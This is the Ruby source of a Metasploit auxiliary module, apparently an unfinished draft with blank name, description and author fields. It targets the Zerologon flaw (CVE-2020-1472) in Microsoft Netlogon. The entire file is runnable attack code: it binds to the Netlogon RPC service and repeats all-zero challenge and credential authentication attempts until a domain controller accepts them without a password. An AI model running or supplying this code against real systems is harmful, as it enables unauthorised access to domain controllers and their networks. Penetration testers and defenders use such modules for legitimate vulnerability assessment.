##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Auxiliary::Report

  Netlogon = RubySMB::Dcerpc::Netlogon

  NRPC_UUID = '12345678-1234-abcd-ef00-01234567cffb'

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '',
      'Description'    => %q{

      },

      'Author'         => [

      ],

      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py'],
      ]
    ))

    register_options(
      [
        Opt::RPORT(0),
        OptString.new('SERVER_NAME', [ true, 'The server\'s NetBIOS name', '', true ])
      ])

  end

  def run
    dport = datastore['RPORT']
    if dport.nil? || dport == 0
      dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], NRPC_UUID, '1.0', 'ncacn_ip_tcp')

      unless dport
        print_error('Could not determine the RPC port used by the Microsoft Netlogon Server')
        # todo: switch this to a fail_with
        return
      end
    end

    # Bind to the service
    handle = dcerpc_handle(Netlogon::UUID, '1.0', 'ncacn_ip_tcp', [dport])
    print_status("Binding to #{handle} ...")
    dcerpc_bind(handle)
    print_status("Bound to #{handle} ...")

    2000.times do
      begin
        response = dcerpc_call(Netlogon::NetrServerReqChallengeRequest.new(
          primary_name: "\\\\#{datastore['SERVER_NAME']}",
          computer_name: datastore['SERVER_NAME'],
          client_challenge: [0] * 8
        ))

        response = dcerpc_call(Netlogon::NetrServerAuthenticate3Request.new(
          primary_name: "\\\\#{datastore['SERVER_NAME']}",
          account_name: "#{datastore['SERVER_NAME']}$",
          secure_channel_type: 6, # SERVER_SECURE_CHANNEL
          computer_name: datastore['SERVER_NAME'],
          client_credential: [0] * 8,
          flags: 0x212fffff
        ))

        status = response.last(4).unpack('V').first
        if status == 0
          print_good('Successfully authenticated')
          return
        end

      rescue ::Exception => e
        print_error("Error: #{e}")
      end
    end
  end

  def dcerpc_call(req)
    vprint_status("Calling #{req.class.name.split('::').last.delete_suffix('Request')}")
    dcerpc.call(req.opnum, req.to_binary_s)
  end
end
